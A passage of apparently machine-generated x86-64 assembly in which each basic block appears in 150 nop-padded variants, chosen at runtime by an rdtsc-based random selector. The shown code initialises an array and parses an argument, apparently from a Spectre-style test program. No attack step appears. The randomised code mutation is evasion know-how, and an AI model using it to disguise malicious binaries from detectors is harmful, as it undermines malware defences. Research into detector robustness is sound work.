	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 122
.Lmain_win6_var122:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 123
.Lmain_win6_var123:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 124
.Lmain_win6_var124:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 125
.Lmain_win6_var125:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 126
.Lmain_win6_var126:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 127
.Lmain_win6_var127:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 128
.Lmain_win6_var128:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 129
.Lmain_win6_var129:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 130
.Lmain_win6_var130:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 131
.Lmain_win6_var131:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 132
.Lmain_win6_var132:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win6_continue
## Variant 133
.Lmain_win6_var133:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 134
.Lmain_win6_var134:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 135
.Lmain_win6_var135:
	popq	%rax
	nop
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 136
.Lmain_win6_var136:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 137
.Lmain_win6_var137:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 138
.Lmain_win6_var138:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 139
.Lmain_win6_var139:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 140
.Lmain_win6_var140:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 141
.Lmain_win6_var141:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 142
.Lmain_win6_var142:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 143
.Lmain_win6_var143:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 144
.Lmain_win6_var144:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 145
.Lmain_win6_var145:
	popq	%rax
	nop
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 146
.Lmain_win6_var146:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 147
.Lmain_win6_var147:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 148
.Lmain_win6_var148:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 149
.Lmain_win6_var149:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
.Lmain_win6_continue:
	addl	$1, %eax
	movl	%eax, -60(%rbp)
	jmp	LBB2_1
LBB2_4:
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win5_var0
	cmpl	$1, %eax
	je	.Lmain_win5_var1
	cmpl	$2, %eax
	je	.Lmain_win5_var2
	cmpl	$3, %eax
	je	.Lmain_win5_var3
	cmpl	$4, %eax
	je	.Lmain_win5_var4
	cmpl	$5, %eax
	je	.Lmain_win5_var5
	cmpl	$6, %eax
	je	.Lmain_win5_var6
	cmpl	$7, %eax
	je	.Lmain_win5_var7
	cmpl	$8, %eax
	je	.Lmain_win5_var8
	cmpl	$9, %eax
	je	.Lmain_win5_var9
	cmpl	$10, %eax
	je	.Lmain_win5_var10
	cmpl	$11, %eax
	je	.Lmain_win5_var11
	cmpl	$12, %eax
	je	.Lmain_win5_var12
	cmpl	$13, %eax
	je	.Lmain_win5_var13
	cmpl	$14, %eax
	je	.Lmain_win5_var14
	cmpl	$15, %eax
	je	.Lmain_win5_var15
	cmpl	$16, %eax
	je	.Lmain_win5_var16
	cmpl	$17, %eax
	je	.Lmain_win5_var17
	cmpl	$18, %eax
	je	.Lmain_win5_var18
	cmpl	$19, %eax
	je	.Lmain_win5_var19
	cmpl	$20, %eax
	je	.Lmain_win5_var20
	cmpl	$21, %eax
	je	.Lmain_win5_var21
	cmpl	$22, %eax
	je	.Lmain_win5_var22
	cmpl	$23, %eax
	je	.Lmain_win5_var23
	cmpl	$24, %eax
	je	.Lmain_win5_var24
	cmpl	$25, %eax
	je	.Lmain_win5_var25
	cmpl	$26, %eax
	je	.Lmain_win5_var26
	cmpl	$27, %eax
	je	.Lmain_win5_var27
	cmpl	$28, %eax
	je	.Lmain_win5_var28
	cmpl	$29, %eax
	je	.Lmain_win5_var29
	cmpl	$30, %eax
	je	.Lmain_win5_var30
	cmpl	$31, %eax
	je	.Lmain_win5_var31
	cmpl	$32, %eax
	je	.Lmain_win5_var32
	cmpl	$33, %eax
	je	.Lmain_win5_var33
	cmpl	$34, %eax
	je	.Lmain_win5_var34
	cmpl	$35, %eax
	je	.Lmain_win5_var35
	cmpl	$36, %eax
	je	.Lmain_win5_var36
	cmpl	$37, %eax
	je	.Lmain_win5_var37
	cmpl	$38, %eax
	je	.Lmain_win5_var38
	cmpl	$39, %eax
	je	.Lmain_win5_var39
	cmpl	$40, %eax
	je	.Lmain_win5_var40
	cmpl	$41, %eax
	je	.Lmain_win5_var41
	cmpl	$42, %eax
	je	.Lmain_win5_var42
	cmpl	$43, %eax
	je	.Lmain_win5_var43
	cmpl	$44, %eax
	je	.Lmain_win5_var44
	cmpl	$45, %eax
	je	.Lmain_win5_var45
	cmpl	$46, %eax
	je	.Lmain_win5_var46
	cmpl	$47, %eax
	je	.Lmain_win5_var47
	cmpl	$48, %eax
	je	.Lmain_win5_var48
	cmpl	$49, %eax
	je	.Lmain_win5_var49
	cmpl	$50, %eax
	je	.Lmain_win5_var50
	cmpl	$51, %eax
	je	.Lmain_win5_var51
	cmpl	$52, %eax
	je	.Lmain_win5_var52
	cmpl	$53, %eax
	je	.Lmain_win5_var53
	cmpl	$54, %eax
	je	.Lmain_win5_var54
	cmpl	$55, %eax
	je	.Lmain_win5_var55
	cmpl	$56, %eax
	je	.Lmain_win5_var56
	cmpl	$57, %eax
	je	.Lmain_win5_var57
	cmpl	$58, %eax
	je	.Lmain_win5_var58
	cmpl	$59, %eax
	je	.Lmain_win5_var59
	cmpl	$60, %eax
	je	.Lmain_win5_var60
	cmpl	$61, %eax
	je	.Lmain_win5_var61
	cmpl	$62, %eax
	je	.Lmain_win5_var62
	cmpl	$63, %eax
	je	.Lmain_win5_var63
	cmpl	$64, %eax
	je	.Lmain_win5_var64
	cmpl	$65, %eax
	je	.Lmain_win5_var65
	cmpl	$66, %eax
	je	.Lmain_win5_var66
	cmpl	$67, %eax
	je	.Lmain_win5_var67
	cmpl	$68, %eax
	je	.Lmain_win5_var68
	cmpl	$69, %eax
	je	.Lmain_win5_var69
	cmpl	$70, %eax
	je	.Lmain_win5_var70
	cmpl	$71, %eax
	je	.Lmain_win5_var71
	cmpl	$72, %eax
	je	.Lmain_win5_var72
	cmpl	$73, %eax
	je	.Lmain_win5_var73
	cmpl	$74, %eax
	je	.Lmain_win5_var74
	cmpl	$75, %eax
	je	.Lmain_win5_var75
	cmpl	$76, %eax
	je	.Lmain_win5_var76
	cmpl	$77, %eax
	je	.Lmain_win5_var77
	cmpl	$78, %eax
	je	.Lmain_win5_var78
	cmpl	$79, %eax
	je	.Lmain_win5_var79
	cmpl	$80, %eax
	je	.Lmain_win5_var80
	cmpl	$81, %eax
	je	.Lmain_win5_var81
	cmpl	$82, %eax
	je	.Lmain_win5_var82
	cmpl	$83, %eax
	je	.Lmain_win5_var83
	cmpl	$84, %eax
	je	.Lmain_win5_var84
	cmpl	$85, %eax
	je	.Lmain_win5_var85
	cmpl	$86, %eax
	je	.Lmain_win5_var86
	cmpl	$87, %eax
	je	.Lmain_win5_var87
	cmpl	$88, %eax
	je	.Lmain_win5_var88
	cmpl	$89, %eax
	je	.Lmain_win5_var89
	cmpl	$90, %eax
	je	.Lmain_win5_var90
	cmpl	$91, %eax
	je	.Lmain_win5_var91
	cmpl	$92, %eax
	je	.Lmain_win5_var92
	cmpl	$93, %eax
	je	.Lmain_win5_var93
	cmpl	$94, %eax
	je	.Lmain_win5_var94
	cmpl	$95, %eax
	je	.Lmain_win5_var95
	cmpl	$96, %eax
	je	.Lmain_win5_var96
	cmpl	$97, %eax
	je	.Lmain_win5_var97
	cmpl	$98, %eax
	je	.Lmain_win5_var98
	cmpl	$99, %eax
	je	.Lmain_win5_var99
	cmpl	$100, %eax
	je	.Lmain_win5_var100
	cmpl	$101, %eax
	je	.Lmain_win5_var101
	cmpl	$102, %eax
	je	.Lmain_win5_var102
	cmpl	$103, %eax
	je	.Lmain_win5_var103
	cmpl	$104, %eax
	je	.Lmain_win5_var104
	cmpl	$105, %eax
	je	.Lmain_win5_var105
	cmpl	$106, %eax
	je	.Lmain_win5_var106
	cmpl	$107, %eax
	je	.Lmain_win5_var107
	cmpl	$108, %eax
	je	.Lmain_win5_var108
	cmpl	$109, %eax
	je	.Lmain_win5_var109
	cmpl	$110, %eax
	je	.Lmain_win5_var110
	cmpl	$111, %eax
	je	.Lmain_win5_var111
	cmpl	$112, %eax
	je	.Lmain_win5_var112
	cmpl	$113, %eax
	je	.Lmain_win5_var113
	cmpl	$114, %eax
	je	.Lmain_win5_var114
	cmpl	$115, %eax
	je	.Lmain_win5_var115
	cmpl	$116, %eax
	je	.Lmain_win5_var116
	cmpl	$117, %eax
	je	.Lmain_win5_var117
	cmpl	$118, %eax
	je	.Lmain_win5_var118
	cmpl	$119, %eax
	je	.Lmain_win5_var119
	cmpl	$120, %eax
	je	.Lmain_win5_var120
	cmpl	$121, %eax
	je	.Lmain_win5_var121
	cmpl	$122, %eax
	je	.Lmain_win5_var122
	cmpl	$123, %eax
	je	.Lmain_win5_var123
	cmpl	$124, %eax
	je	.Lmain_win5_var124
	cmpl	$125, %eax
	je	.Lmain_win5_var125
	cmpl	$126, %eax
	je	.Lmain_win5_var126
	cmpl	$127, %eax
	je	.Lmain_win5_var127
	cmpl	$128, %eax
	je	.Lmain_win5_var128
	cmpl	$129, %eax
	je	.Lmain_win5_var129
	cmpl	$130, %eax
	je	.Lmain_win5_var130
	cmpl	$131, %eax
	je	.Lmain_win5_var131
	cmpl	$132, %eax
	je	.Lmain_win5_var132
	cmpl	$133, %eax
	je	.Lmain_win5_var133
	cmpl	$134, %eax
	je	.Lmain_win5_var134
	cmpl	$135, %eax
	je	.Lmain_win5_var135
	cmpl	$136, %eax
	je	.Lmain_win5_var136
	cmpl	$137, %eax
	je	.Lmain_win5_var137
	cmpl	$138, %eax
	je	.Lmain_win5_var138
	cmpl	$139, %eax
	je	.Lmain_win5_var139
	cmpl	$140, %eax
	je	.Lmain_win5_var140
	cmpl	$141, %eax
	je	.Lmain_win5_var141
	cmpl	$142, %eax
	je	.Lmain_win5_var142
	cmpl	$143, %eax
	je	.Lmain_win5_var143
	cmpl	$144, %eax
	je	.Lmain_win5_var144
	cmpl	$145, %eax
	je	.Lmain_win5_var145
	cmpl	$146, %eax
	je	.Lmain_win5_var146
	cmpl	$147, %eax
	je	.Lmain_win5_var147
	cmpl	$148, %eax
	je	.Lmain_win5_var148
	cmpl	$149, %eax
	je	.Lmain_win5_var149
	jmp	.Lmain_win5_var0
## Variant 0
.Lmain_win5_var0:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 1
.Lmain_win5_var1:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 2
.Lmain_win5_var2:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 3
.Lmain_win5_var3:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 4
.Lmain_win5_var4:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 5
.Lmain_win5_var5:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 6
.Lmain_win5_var6:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 7
.Lmain_win5_var7:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 8
.Lmain_win5_var8:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 9
.Lmain_win5_var9:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 10
.Lmain_win5_var10:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 11
.Lmain_win5_var11:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 12
.Lmain_win5_var12:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 13
.Lmain_win5_var13:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 14
.Lmain_win5_var14:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 15
.Lmain_win5_var15:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 16
.Lmain_win5_var16:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	nop
	jmp	.Lmain_win5_continue
## Variant 17
.Lmain_win5_var17:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 18
.Lmain_win5_var18:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 19
.Lmain_win5_var19:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 20
.Lmain_win5_var20:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 21
.Lmain_win5_var21:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 22
.Lmain_win5_var22:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 23
.Lmain_win5_var23:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 24
.Lmain_win5_var24:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 25
.Lmain_win5_var25:
	popq	%rax
